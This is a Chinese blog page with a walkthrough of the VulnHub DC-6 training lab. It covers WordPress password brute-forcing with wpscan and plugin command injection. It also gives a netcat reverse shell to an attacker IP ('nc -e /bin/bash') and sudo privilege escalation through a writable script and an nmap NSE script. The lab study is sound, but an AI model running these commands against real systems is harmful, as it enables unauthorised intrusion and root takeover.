@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>vulnhub靶场记录DC-6 | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub靶场DC-6靶场描述DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  This isn&#39;t an overly difficult challenge so should be gr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶场记录DC-6">
+<meta property="og:url" content="http://w3nx1z1.github.io/posts/f39944c9.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="vulnhub靶场DC-6靶场描述DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  This isn&#39;t an overly difficult challenge so should be gr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2024-02-29T02:34:41.927Z">
+<meta property="article:modified_time" content="2025-02-14T08:30:17.437Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/posts/f39944c9.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="TndEWE7xyUxTUkbHXgpxFtutY3_VE4qYCNq6-qHt11I"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub靶场记录DC-6',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-14 16:30:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub靶场记录DC-6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-29T02:34:41.927Z" title="发表于 2024-02-29 10:34:41">2024-02-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-14T08:30:17.437Z" title="更新于 2025-02-14 16:30:17">2025-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub靶场记录DC-6"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub靶场DC-6"><a href="#vulnhub靶场DC-6" class="headerlink" title="vulnhub靶场DC-6"></a>vulnhub靶场DC-6</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
+
+This isn&#39;t an overly difficult challenge so should be great for beginners.
+
+The ultimate goal of this challenge is to get root and to read the one and only flag.
+
+Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
+
+For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.
+</code></pre>
+<h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先使用nmap扫描靶机ip</p>
+<pre><code>nmap 192.168.160.0/24
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171832816.png" alt="image-20240117183209736"></p>
+<p>扫到ip为192.168.160.157 开放了22和80端口</p>
+<p>在扫描靶机端口</p>
+<pre><code>nmap -A -p- -v 192.168.160.157
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171834090.png" alt="image-20240117183420041"></p>
+<pre><code>开放22端口 存在ssh服务 OpenSSH版本 7.4p1
+开放80端口 存在web服务 使用Apache中间件 版本2.4.25
+</code></pre>
+<h3 id="二、修改hosts文件-进行重定向"><a href="#二、修改hosts文件-进行重定向" class="headerlink" title="二、修改hosts文件 进行重定向"></a>二、修改hosts文件 进行重定向</h3><p>我们可以看到在扫到的80端口处 说明了不能直接定向到目标网站</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181745520.png" alt="image-20240118174515479"></p>
+<p>我们尝试访问网站  当然也是访问不了的 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181744269.png" alt="image-20240118174402203"></p>
+<p>那就需要我们修改本地hosts文件(&#x2F;etc&#x2F;hosts)  将ip和域名添加进去</p>
+<pre><code>192.168.160.157 wordy
+</code></pre>
+<p>就可以成功访问了 (访问192.168.160.157)</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182157924.png" alt="image-20240118215758484"></p>
+<p>能看到是一个wordpress的网站</p>
+<h3 id="三、网站信息搜集"><a href="#三、网站信息搜集" class="headerlink" title="三、网站信息搜集"></a>三、网站信息搜集</h3><h4 id="使用whatweb看网站信息"><a href="#使用whatweb看网站信息" class="headerlink" title="使用whatweb看网站信息"></a>使用whatweb看网站信息</h4><pre><code>whatweb -v 192.168.160.157
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182158418.png" alt="image-20240118215835245"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182159742.png" alt="image-20240118215918499"></p>
+<p>看到wordpress的版本是5.1.1</p>
+<h4 id="使用dirsearch-py扫目录"><a href="#使用dirsearch-py扫目录" class="headerlink" title="使用dirsearch.py扫目录"></a>使用dirsearch.py扫目录</h4><pre><code>python3 ./dirsearch.py -u http://192.168.160.157
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182210224.png" alt="image-20240118221023088"></p>
+<p>扫到了该网站wordpress的后台登陆页面 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219850.png" alt="image-20240118221904796"></p>
+<p>还扫到了一个目录页面</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219324.png" alt="image-20240118221933265"></p>
+<h4 id="使用cewl搜集网站登录密码"><a href="#使用cewl搜集网站登录密码" class="headerlink" title="使用cewl搜集网站登录密码"></a>使用cewl搜集网站登录密码</h4><p>既然扫到了网站后台登陆页面 我们就来搜集一波网站里面的密码 使用cewl</p>
+<p>cewl的使用姿势在DC-2的文章中有提到<a href="https://w3nx1z1.github.io/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/">DC-2通关记录</a></p>
+<pre><code>cewl http://wordy/ -w dc6dict.txt
+从网站中获取密码并将其保存在dc6dict.txt文件中
+</code></pre>
+<h4 id="首页信息"><a href="#首页信息" class="headerlink" title="首页信息"></a>首页信息</h4><p>网站首页的信息提示我们可能与插件有关</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182232914.png" alt="image-20240118223258687"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182233611.png" alt="image-20240118223314553"></p>
+<h3 id="四、wpscan爆破网站密码"><a href="#四、wpscan爆破网站密码" class="headerlink" title="四、wpscan爆破网站密码"></a>四、wpscan爆破网站密码</h3><p>我们已经有了网站密码字典 在使用wpscan扫一下网站用户名字典</p>
+<pre><code>wpscan --url http://wordy/ -e u 
+</code></pre>
+<p>扫出来五个用户</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182238256.png" alt="image-20240118223810205"></p>
+<p>制作一个用户名字典 写入这些用户名 使用wpscan开始爆破</p>
+<pre><code>wpscan wpscan --url http://dc-2/ -P dc6dict.txt -U user.txt
+</code></pre>
+<p>没爆出来 那我们换个字典 直接使用kali里面自带的字典<code>rockyou.txt</code> 并且作者在靶场下载页面处还给了一个提示 方便我们缩小密码字典范围 便于爆破</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182305673.png" alt="image-20240118230529591"></p>
+<pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt
+wpscan --url http://wordy/ -P passwords.txt -U user.txt 
+</code></pre>
+<p>爆破出一组账号密码<code>mark / helpdesk01</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182308006.png" alt="image-20240118230819959"></p>
+<p>使用这组账号密码登陆 网站后台 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182309959.png" alt="image-20240118230928877"></p>
+<h3 id="五、漏洞发现与利用"><a href="#五、漏洞发现与利用" class="headerlink" title="五、漏洞发现与利用"></a>五、漏洞发现与利用</h3><h4 id="activity-monitor插件漏洞"><a href="#activity-monitor插件漏洞" class="headerlink" title="activity monitor插件漏洞"></a>activity monitor插件漏洞</h4><p>登陆进去之后 可以看到有一个<code>activity monitor</code> 插件 结合首页上的提示 猜测这个插件有漏洞</p>
+<h5 id="方法一：使用searchsploit搜索漏洞利用脚本"><a href="#方法一：使用searchsploit搜索漏洞利用脚本" class="headerlink" title="方法一：使用searchsploit搜索漏洞利用脚本"></a>方法一：使用searchsploit搜索漏洞利用脚本</h5><p>直接使用searchsploit搜索漏洞脚本</p>
+<pre><code>searchsploit activity monitor
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609102.png" alt="image-20240228160910052"></p>
+<p>直接找一下最后一个</p>
+<pre><code>searchsploit -p 50110.py
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609279.png" alt="image-20240228160944243"></p>
+<pre><code>cp /usr/share/exploitdb/exploits/php/webapps/50110.py 50110.py
+</code></pre>
+<p>看一下里面的内容 用法里面写着直接python运行就可以了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281627638.png" alt="image-20240228162714585"></p>
+<p>成功拿到权限 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281629064.png" alt="image-20240228162938028"></p>
+<p>为了便于操作 我们在反弹shell并创建一个新的交互式终端</p>
+<pre><code>nc -e /bin/bash 192.168.160.131 4444   
+nc -lvvp 4444
+python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281939666.png" alt="image-20240228193904627"></p>
+<h5 id="方法二：在页面插件处进行命令执行"><a href="#方法二：在页面插件处进行命令执行" class="headerlink" title="方法二：在页面插件处进行命令执行"></a>方法二：在页面插件处进行命令执行</h5><p>还是在插件的页面  我们找到了一处可以注入的点</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281916924.png" alt="image-20240228191642845"></p>
+<p>lookup按钮会将填入的ip地址解析为主机名 我们尝试随便写一个ip地址并注入命令进行抓包测试</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281922648.png" alt="image-20240228192247557"></p>
+<p>很明显 后面我们注入的<code>ls</code>命令被成功执行了 那就可以在这个页面进行命令注入反弹shell 在创建一个交互式终端</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016344.png" alt="image-20240228201634263"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016870.png" alt="image-20240228201646830"></p>
+<h3 id="六、提权-nmap提权"><a href="#六、提权-nmap提权" class="headerlink" title="六、提权(nmap提权)"></a>六、提权(nmap提权)</h3><p>在文件系统中进行翻找 在<code>/home/mark/stuff</code>文件夹下找到一个<code>things-to-do.txt</code>文件 读取文件内容</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282033562.png" alt="image-20240228203350516"></p>
+<pre><code>Things to do:
+
+- Restore full functionality for the hyperdrive (need to speak to Jens)
+- Buy present for Sarah&#39;s farewell party
+- Add new user: graham - GSo7isUM1D4 - done
+- Apply for the OSCP course
+- Buy new laptop for Sarah&#39;s replacement
+</code></pre>
+<p>在这里面找到了用户<code>graham</code>的登录密码<code>GSo7isUM1D4</code> 切换用户</p>
+<p>查看可以使用的sudo权限命令</p>
+<pre><code>sudo -l
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282057054.png" alt="image-20240228205758013"></p>
+<p>发现这个<code>/home/jens/backups.sh</code>文件可以无密码执行  读一下内容</p>
+<pre><code>#!/bin/bash
+tar -czf backups.tar.gz /var/www/html
+</code></pre>
+<p>将<code>/bin/bash</code>写入这个文件 在运行 就可以获得jens权限的shell(因为backups.sh可以无密码运行)</p>
+<pre><code class="bash">echo &quot;/bin/bash&quot; &gt;&gt;backups.sh
+sudo -u jens /home/jens/backups.sh
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109825.png" alt="image-20240228210914783"></p>
+<p>再次查看jens用户拥有的sudo权限命令 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109205.png" alt="image-20240228210958162"></p>
+<p>发现可以无密码使用nmap 直接找一下nmap提权</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zijiaijd/article/details/117165224?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170912594416800197039668%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170912594416800197039668&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-117165224-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=nmap%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187">nmap提权几种方式</a>  这里我们选择方法二  使用nmap –script参数执行脚本</p>
+<pre><code class="bash">echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; 1.nse # nse是nmao插件扩展名
+sudo nmap --script=/home/jens/1.use
+id
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120403.png" alt="image-20240228212018376"></p>
+<pre><code>cd /root
+cat theflag.txt
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120269.png" alt="image-20240228212047220"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-6渗透完毕</p>
+<pre><code>wpscan爆破密码
+activity monitor插件漏洞
+nmap提权
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/posts/f39944c9.html">http://w3nx1z1.github.io/posts/f39944c9.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/9b920400.html" title="2023年中国工业互联网安全大赛决赛-misc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023年中国工业互联网安全大赛决赛-misc</div></div></a></div><div class="next-post pull-right"><a href="/posts/b43b973d.html" title="2023陇剑杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023陇剑杯</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3bc2e38b.html" title="Offensive Pentesting-Alfred"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">Offensive Pentesting-Alfred</div></div></a></div><div><a href="/posts/dea42128.html" title="Offensive Pentesting-DailyBugle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-DailyBugle</div></div></a></div><div><a href="/posts/dda9dc81.html" title="Offensive Pentesting-GameZone"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-GameZone</div></div></a></div><div><a href="/posts/3e5876b.html" title="Offensive Pentesting-Overpass2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-11</div><div class="title">Offensive Pentesting-Overpass2</div></div></a></div><div><a href="/posts/34fc8f4b.html" title="Offensive Pentesting-Steel Mountain"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">Offensive Pentesting-Steel Mountain</div></div></a></div><div><a href="/posts/c70d91b2.html" title="Offensive Pentesting-Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-Skynet</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E5%9C%BADC-6"><span class="toc-text">vulnhub靶场DC-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-text">靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA"><span class="toc-text">渗透靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">一、信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%AE%E6%94%B9hosts%E6%96%87%E4%BB%B6-%E8%BF%9B%E8%A1%8C%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">二、修改hosts文件 进行重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">三、网站信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8whatweb%E7%9C%8B%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF"><span class="toc-text">使用whatweb看网站信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8dirsearch-py%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="toc-text">使用dirsearch.py扫目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8cewl%E6%90%9C%E9%9B%86%E7%BD%91%E7%AB%99%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-text">使用cewl搜集网站登录密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-text">首页信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 